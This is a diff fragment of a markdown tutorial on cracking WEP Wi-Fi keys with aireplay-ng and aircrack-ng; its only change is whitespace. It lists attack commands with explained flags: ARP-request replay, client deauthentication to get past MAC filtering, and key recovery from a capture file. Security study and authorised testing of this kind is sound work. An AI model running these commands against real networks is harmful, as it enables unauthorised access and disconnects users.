@@ -23,7 +23,7 @@ Mac filtering is turned off
 ##### No MAC filtering  
 --- `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... MAC address of your choice.  
 ##### MAC filtering 
--- `sudo aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:00:00:00:00:00 <interface>`  -0... Number of deauthentication attempts. -a... MAC address of target access point.  -c... Client MAC address.
+-- `sudo aireplay-ng -0 5 -a 00:09:5B:D7:43:A8 -c 00:00:00:00:00:00 <interface>`  -0... Number of deauthentication attempts. -a... MAC address of target access point.  -c... Client MAC address.  
 4. `sudo aireplay-ng -3 -b 00:09:5B:D7:43:A8 -h 00:00:00:00:00:00 <interface>`  -3... Standard ARP-request replay. -b... MAC address of target access point. -h... Client MAC address.  
 ##### Decryption with "aircrack-ng" & "aircrack-ptw"  
 1. `sudo aircrack-ng <file_name>.cap`  
